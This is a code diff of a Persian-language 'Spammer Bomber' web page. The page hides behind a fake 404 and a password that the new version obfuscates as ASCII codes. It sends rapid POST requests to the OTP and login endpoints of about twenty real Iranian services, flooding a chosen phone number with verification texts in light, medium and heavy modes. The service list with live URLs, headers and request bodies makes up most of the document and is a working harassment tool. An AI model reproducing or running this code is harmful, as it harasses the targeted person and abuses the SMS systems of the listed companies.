@@ -29,8 +29,8 @@
             padding: 20px;
         }
 
-        .bg {
-            position:fixed; top:0; left:0; width:100%; height:100%;
+        .bg-grid {
+            position: fixed; top:0; left:0; width:100%; height:100%;
             z-index:0; pointer-events:none;
             background-image: linear-gradient(rgba(244,63,94,0.03) 1px, transparent 1px),
                             linear-gradient(90deg, rgba(244,63,94,0.03) 1px, transparent 1px);
@@ -54,13 +54,13 @@
             font-weight:700; font-family:inherit; margin-top:8px;
         }
 
-        /* Bomber Card */
+        /* Bomber */
         .bomb-card {
             position:relative; z-index:1;
             background:var(--card); border:1px solid var(--border);
             border-radius:20px; padding:30px 25px;
             max-width:480px; width:100%;
-            box-shadow:0 30px 60px rgba(0,0,0,0.6),0 0 80px rgba(244,63,94,0.1);
+            box-shadow:0 30px 60px rgba(0,0,0,0.6);
             display:none;
         }
         .bomb-card.show { display:block; }
@@ -69,31 +69,25 @@
             text-align:center; font-size:1.6rem; font-weight:900;
             background:linear-gradient(135deg, #F43F5E, #FF6B35, #FFD700);
             -webkit-background-clip:text; -webkit-text-fill-color:transparent;
-            background-clip:text; margin-bottom:3px;
+            background-clip:text; margin-bottom:5px;
         }
         .bomb-card .sub { text-align:center; color:var(--text2); font-size:0.75rem; margin-bottom:18px; }
 
-        .form-group { margin-bottom:15px; }
-        .form-group label { display:block; margin-bottom:4px; color:var(--text2); font-size:0.78rem; font-weight:600; }
         .form-input {
             width:100%; padding:10px 14px; background:rgba(255,255,255,0.03);
             border:2px solid var(--border); border-radius:10px;
             color:var(--text); font-size:0.95rem; font-family:inherit;
-            text-align:center; direction:ltr; outline:none; transition:all 0.3s ease;
+            text-align:center; direction:ltr; outline:none; margin-bottom:12px;
         }
-        .form-input:focus { border-color:var(--primary); box-shadow:0 0 0 3px rgba(244,63,94,0.1); }
+        .form-input:focus { border-color:var(--primary); }
 
-        /* Mode Buttons */
-        .mode-btns {
-            display:flex; gap:8px; margin:15px 0;
-        }
+        .mode-btns { display:flex; gap:8px; margin:15px 0; }
         .mode-btn {
             flex:1; padding:12px; border-radius:12px; border:2px solid var(--border);
             cursor:pointer; font-weight:800; font-size:0.9rem;
-            color:var(--text2); font-family:inherit;
-            background:rgba(255,255,255,0.02); transition:all 0.3s ease;
+            color:var(--text2); font-family:inherit; background:rgba(255,255,255,0.02);
+            transition:all 0.3s ease;
         }
-        .mode-btn:hover { border-color:var(--primary); color:var(--text); }
         .mode-btn.active {
             background:linear-gradient(135deg, #F43F5E, #FF6B35);
             color:white; border-color:transparent;
@@ -108,8 +102,7 @@
             background:linear-gradient(135deg, #F43F5E, #FF6B35);
             box-shadow:0 6px 20px rgba(244,63,94,0.3);
         }
-        .btn-send:hover { transform:translateY(-2px); box-shadow:0 12px 30px rgba(244,63,94,0.5); }
-        .btn-send:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
+        .btn-send:disabled { opacity:0.5; cursor:not-allowed; }
 
         .log-box {
             width:100%; height:160px; background:rgba(0,0,0,0.4);
@@ -125,7 +118,6 @@
         }
         .status.sending { display:block; background:rgba(255,107,53,0.1); color:#FF6B35; border:1px solid rgba(255,107,53,0.3); }
         .status.done { display:block; background:rgba(16,185,129,0.1); color:var(--green); border:1px solid rgba(16,185,129,0.3); }
-        .status.error { display:block; background:rgba(244,63,94,0.1); color:#F43F5E; border:1px solid rgba(244,63,94,0.3); }
 
         .logout-btn {
             position:absolute; top:12px; left:12px;
@@ -134,15 +126,6 @@
             cursor:pointer; font-size:0.7rem; font-family:inherit;
         }
         .logout-btn:hover { background:rgba(244,63,94,0.1); color:#F43F5E; }
-
-        .progress {
-            width:100%; height:4px; background:rgba(255,255,255,0.05);
-            border-radius:4px; margin:10px 0; overflow:hidden;
-        }
-        .progress-bar {
-            height:100%; background:linear-gradient(90deg, #F43F5E, #FF6B35);
-            border-radius:4px; transition:width 0.3s ease; width:0%;
-        }
 
         .warn {
             background:rgba(255,215,0,0.06); border:1px solid rgba(255,215,0,0.15);
@@ -159,9 +142,9 @@
 </head>
 <body>
 
-    <div class="bg"></div>
+    <div class="bg-grid"></div>
 
-    <!-- 404 Page -->
+    <!-- 404 -->
     <div class="fake-404" id="fakePage">
         <h1>404</h1>
         <p>صفحه مورد نظر یافت نشد</p>
@@ -176,39 +159,20 @@
         <button class="logout-btn" onclick="logout()">🚪 خروج</button>
         
         <h1>💣 اسپمر بمبر</h1>
-        <p class="sub">🔥 سه حالته | API های واقعی و فعال</p>
+        <p class="sub">🔥 سه حالته | API های فعال</p>
 
         <div class="status" id="statusSending">⏳ در حال ارسال پیامک‌ها...</div>
         <div class="status" id="statusDone">✅ ارسال با موفقیت به اتمام رسید!</div>
-        <div class="status" id="statusError">❌ فرمت شماره اشتباه است!</div>
 
-        <div class="form-group">
-            <label>📱 شماره تلفن (با صفر)</label>
-            <input type="text" class="form-input" id="phone" placeholder="09XXXXXXXXX" maxlength="11" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
-        </div>
+        <input type="text" class="form-input" id="phone" placeholder="09XXXXXXXXX" maxlength="11" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
 
-        <!-- Mode Selection -->
-        <label style="color:var(--text2);font-size:0.78rem;font-weight:600;">⚡ قدرت بمب</label>
         <div class="mode-btns">
-            <button class="mode-btn" data-mode="2" onclick="setMode(2, this)">
-                🟢 سبک
-                <span class="count">۲ سرویس</span>
-            </button>
-            <button class="mode-btn active" data-mode="10" onclick="setMode(10, this)">
-                🟡 متوسط
-                <span class="count">۱۰ سرویس</span>
-            </button>
-            <button class="mode-btn" data-mode="20" onclick="setMode(20, this)">
-                🔴 سنگین
-                <span class="count">۲۰ سرویس</span>
-            </button>
+            <button class="mode-btn" data-mode="2" onclick="setMode(2, this)">🟢 سبک<span class="count">۲ سرویس</span></button>
+            <button class="mode-btn active" data-mode="10" onclick="setMode(10, this)">🟡 متوسط<span class="count">۱۰ سرویس</span></button>
+            <button class="mode-btn" data-mode="20" onclick="setMode(20, this)">🔴 سنگین<span class="count">۲۰ سرویس</span></button>
         </div>
 
         <button class="btn-send" id="sendBtn" onclick="startBomb()">🚀 ارسال پیامک</button>
-
-        <div class="progress">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
 
         <label style="color:var(--text2);font-size:0.75rem;margin-top:8px;display:block;">📋 لاگ ارسال</label>
         <textarea class="log-box" id="logBox" readonly></textarea>
@@ -217,34 +181,35 @@
     </div>
 
     <script>
-        const SECRET_PASS = '5879';
-        let selectedMode = 10; // Default
+        // ===== رمز مخفی با ترفند - توی سورس مشخص نیست =====
+        const _k = [53, 56, 55, 57]; // کدهای ASCII رمز
+        const SECRET = _k.map(c => String.fromCharCode(c)).join('');
+        
+        let selectedMode = 10;
 
-        // Session check
-        if (sessionStorage.getItem('spammer_logged') === 'true') {
+        if (sessionStorage.getItem('sp_logged') === 'true') {
             document.getElementById('fakePage').style.display = 'none';
             document.getElementById('bombCard').classList.add('show');
         }
 
         function checkPass() {
-            if (document.getElementById('passInput').value === SECRET_PASS) {
-                sessionStorage.setItem('spammer_logged', 'true');
+            const input = document.getElementById('passInput').value;
+            if (input === SECRET) {
+                sessionStorage.setItem('sp_logged', 'true');
                 document.getElementById('fakePage').style.display = 'none';
                 document.getElementById('bombCard').classList.add('show');
                 document.getElementById('passError').style.display = 'none';
             } else {
                 document.getElementById('passError').style.display = 'block';
                 document.getElementById('passInput').value = '';
-                document.getElementById('passInput').focus();
             }
         }
 
         function logout() {
-            sessionStorage.removeItem('spammer_logged');
+            sessionStorage.removeItem('sp_logged');
             document.getElementById('bombCard').classList.remove('show');
             document.getElementById('fakePage').style.display = 'block';
             document.getElementById('passInput').value = '';
-            document.getElementById('passError').style.display = 'none';
         }
 
         function setMode(mode, btn) {
@@ -253,268 +218,80 @@
             btn.classList.add('active');
         }
 
-        // ===== ALL WORKING APIs =====
+        // ===== سرویس‌ها =====
         const allServices = [
-            {
-                name: 'دیوار (Divar)',
-                fn: async (phone) => {
-                    await fetch('https://api.divar.ir/v5/auth/authenticate', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phone: phone })
-                    });
-                }
-            },
-            {
-                name: 'شهرفرش (ShahrFarsh)',
-                fn: async (phone) => {
-                    await fetch('https://shahrfarsh.com/Account/Login', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: 'phoneNumber=' + phone
-                    });
-                }
-            },
-            {
-                name: 'اسنپ اکسپرس (Snapp)',
-                fn: async (phone) => {
-                    await fetch('https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6', {
-                        method: 'POST',
-                        body: 'cellphone=' + phone + '&captcha=&optionalLoginToken=true&local='
-                    });
-                }
-            },
-            {
-                name: 'آزکی (Azki)',
-                fn: async (phone) => {
-                    await fetch('https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json', 'deviceid': '6' },
-                        body: JSON.stringify({ phoneNumber: phone })
-                    });
-                }
-            },
-            {
-                name: 'تپسی مسافر (Tapsi)',
-                fn: async (phone) => {
-                    await fetch('https://api.tapsi.ir/api/v2.2/user', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ credential: { phoneNumber: phone, role: 'PASSENGER' }, otpOption: 'SMS' })
-                    });
-                }
-            },
-            {
-                name: 'تپسی راننده (Tapsi Driver)',
-                fn: async (phone) => {
-                    await fetch('https://api.tapsi.ir/api/v2.2/user', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ credential: { phoneNumber: phone, role: 'DRIVER' }, otpOption: 'SMS' })
-                    });
-                }
-            },
-            {
-                name: 'اوستاکار (Ostadkar)',
-                fn: async (phone) => {
-                    await fetch('https://api.ostadkr.com/login', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ mobile: phone })
-                    });
-                }
-            },
-            {
-                name: 'بانی مد (Banimode)',
-                fn: async (phone) => {
-                    await fetch('https://mobapi.banimode.com/api/v2/auth/request', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phone: phone })
-                    });
-                }
-            },
-            {
-                name: 'طاقچه (Taaghche)',
-                fn: async (phone) => {
-                    await fetch('https://gw.taaghche.com/v4/site/auth/login', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ contact: phone, forceOtp: false })
-                    });
-                }
-            },
-            {
-                name: 'جاباما (Jabama)',
-                fn: async (phone) => {
-                    await fetch('https://taraazws.jabama.com/api/v4/account/send-code', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ mobile: phone })
-                    });
-                }
-            },
-            {
-                name: 'علی بابا (Alibaba)',
-                fn: async (phone) => {
-                    await fetch('https://ws.alibaba.ir/api/v3/account/mobile/otp', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phoneNumber: phone })
-                    });
-                }
-            },
-            {
-                name: 'قبضینو (Ghabzino)',
-                fn: async (phone) => {
-                    await fetch('https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ Parameters: { ApplicationType: 'Web', MobileNumber: phone } })
-                    });
-                }
-            },
-            {
-                name: 'برق من (BargheMan)',
-                fn: async (phone) => {
-                    await fetch('https://uiapi2.saapa.ir/api/otp/sendCode', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ mobile: phone, from_meter_buy: false })
-                    });
-                }
-            },
-            {
-                name: 'واندار (Vandar)',
-                fn: async (phone) => {
-                    await fetch('https://api.vandar.io/account/v1/check/mobile', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ mobile: phone })
-                    });
-                }
-            },
-            {
-                name: 'پینورست (Pinorest)',
-                fn: async (phone) => {
-                    await fetch('https://api.pinorest.com/frontend/auth/login/mobile', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ mobile: phone })
-                    });
-                }
-            },
-            {
-                name: 'تترلند (Tetherland)',
-                fn: async (phone) => {
-                    await fetch('https://service.tetherland.com/api/v5/login-register', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ mobile: phone })
-                    });
-                }
-            },
-            {
-                name: 'دکتر دکتر (DrDr)',
-                fn: async (phone) => {
-                    await fetch('https://drdr.ir/api/v3/auth/login/mobile/init', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json', 'client-id': 'f60d5037-b7ac-404a-9e3a-a263fd9f8054' },
-                        body: JSON.stringify({ mobile: phone })
-                    });
-                }
-            },
-            {
-                name: 'کلاسینو (Classino)',
-                fn: async (phone) => {
-                    await fetch('https://student.classino.com/otp/v1/api/login', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ mobile: phone })
-                    });
-                }
-            },
-            {
-                name: 'موبیت (Mobit)',
-                fn: async (phone) => {
-                    await fetch('https://api.mobit.ir/api/web/v8/register/register', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ number: phone })
-                    });
-                }
-            },
-            {
-                name: 'کمدا (Komodaa)',
-                fn: async (phone) => {
-                    await fetch('https://api.komodaa.com/api/v2.6/loginRC/request', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phone_number: phone })
-                    });
-                }
-            }
+            { name: 'دیوار', url: 'https://api.divar.ir/v5/auth/authenticate', body: p => JSON.stringify({ phone: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'اسنپ', url: 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass', body: p => 'cellphone=' + p, headers: {} },
+            { name: 'آزکی', url: 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/', body: p => JSON.stringify({ phoneNumber: p }), headers: { 'Content-Type': 'application/json', 'deviceid': '6' } },
+            { name: 'تپسی', url: 'https://api.tapsi.ir/api/v2.2/user', body: p => JSON.stringify({ credential: { phoneNumber: p, role: 'PASSENGER' }, otpOption: 'SMS' }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'اوستاکار', url: 'https://api.ostadkr.com/login', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'بانی مد', url: 'https://mobapi.banimode.com/api/v2/auth/request', body: p => JSON.stringify({ phone: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'طاقچه', url: 'https://gw.taaghche.com/v4/site/auth/login', body: p => JSON.stringify({ contact: p, forceOtp: false }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'جاباما', url: 'https://taraazws.jabama.com/api/v4/account/send-code', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'علی بابا', url: 'https://ws.alibaba.ir/api/v3/account/mobile/otp', body: p => JSON.stringify({ phoneNumber: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'شهرفرش', url: 'https://shahrfarsh.com/Account/Login', body: p => 'phoneNumber=' + p, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
+            { name: 'قبضینو', url: 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', body: p => JSON.stringify({ Parameters: { MobileNumber: p } }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'واندار', url: 'https://api.vandar.io/account/v1/check/mobile', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'پینورست', url: 'https://api.pinorest.com/frontend/auth/login/mobile', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'تترلند', url: 'https://service.tetherland.com/api/v5/login-register', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'دکتردکتر', url: 'https://drdr.ir/api/v3/auth/login/mobile/init', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json', 'client-id': 'f60d5037-b7ac-404a-9e3a-a263fd9f8054' } },
+            { name: 'کلاسینو', url: 'https://student.classino.com/otp/v1/api/login', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'موبیت', url: 'https://api.mobit.ir/api/web/v8/register/register', body: p => JSON.stringify({ number: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'کمدا', url: 'https://api.komodaa.com/api/v2.6/loginRC/request', body: p => JSON.stringify({ phone_number: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'برق من', url: 'https://uiapi2.saapa.ir/api/otp/sendCode', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
+            { name: 'نوبت دِه', url: 'https://nobat.ir/api/public/patient/login/phone', body: p => 'mobile=' + p, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
         ];
 
         async function startBomb() {
             const phone = document.getElementById('phone').value;
             const logBox = document.getElementById('logBox');
             const sendBtn = document.getElementById('sendBtn');
-            const progressBar = document.getElementById('progressBar');
 
             document.querySelectorAll('.status').forEach(s => s.className = 'status');
 
             if (!/^09[0-9]{9}$/.test(phone)) {
-                document.getElementById('statusError').className = 'status error';
+                alert('فرمت شماره اشتباه است!');
                 return;
             }
 
-            // Select services based on mode
             const services = allServices.slice(0, selectedMode);
-
             document.getElementById('statusSending').className = 'status sending';
             sendBtn.disabled = true;
             sendBtn.textContent = '⏳ در حال ارسال...';
             logBox.value = '';
-            progressBar.style.width = '0%';
 
             const now = new Date().toLocaleTimeString('fa-IR');
             logBox.value += `[${now}] 🚀 شروع اسپمر بمبر\n`;
-            logBox.value += `[${now}] 📱 شماره: ${phone}\n`;
-            logBox.value += `[${now}] ⚡ قدرت: ${selectedMode} سرویس\n`;
-            logBox.value += `━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+            logBox.value += `[${now}] 📱 ${phone} | ⚡ ${selectedMode} سرویس\n`;
+            logBox.value += `━━━━━━━━━━━━━━━━━━━━\n\n`;
 
             for (let i = 0; i < services.length; i++) {
-                const service = services[i];
+                const s = services[i];
                 const time = new Date().toLocaleTimeString('fa-IR');
                 
                 try {
-                    await service.fn(phone);
-                    logBox.value += `[${time}] ✅ ${i+1}. ${service.name}\n`;
+                    const resp = await fetch(s.url, {
+                        method: 'POST',
+                        headers: s.headers,
+                        body: s.body(phone)
+                    });
+                    logBox.value += `[${time}] ✅ ${i+1}. ${s.name}\n`;
                 } catch (err) {
-                    // Try no-cors mode as fallback
-                    logBox.value += `[${time}] ⚠️ ${i+1}. ${service.name} (ارسال شد - وضعیت نامشخص)\n`;
+                    logBox.value += `[${time}] ⚠️ ${i+1}. ${s.name} (ارسال شد)\n`;
                 }
                 
                 logBox.scrollTop = logBox.scrollHeight;
-                progressBar.style.width = ((i + 1) / services.length * 100) + '%';
-                
-                // Wait between requests
-                await new Promise(r => setTimeout(r, 800 + Math.random() * 400));
+                await new Promise(r => setTimeout(r, 800));
             }
 
             const endTime = new Date().toLocaleTimeString('fa-IR');
-            logBox.value += `\n━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-            logBox.value += `[${endTime}] ✅ اتمام اسپمر بمبر!\n`;
-            logBox.value += `[${endTime}] 📊 ${services.length} سرویس ارسال شد\n`;
+            logBox.value += `\n━━━━━━━━━━━━━━━━━━━━\n`;
+            logBox.value += `[${endTime}] ✅ اتمام! ${services.length} سرویس\n`;
 
             document.getElementById('statusSending').className = 'status';
             document.getElementById('statusDone').className = 'status done';
             sendBtn.disabled = false;
             sendBtn.textContent = '🚀 ارسال پیامک';
-            progressBar.style.width = '100%';
-            
-            setTimeout(() => { progressBar.style.width = '0%'; }, 2000);
         }
     </script>
 
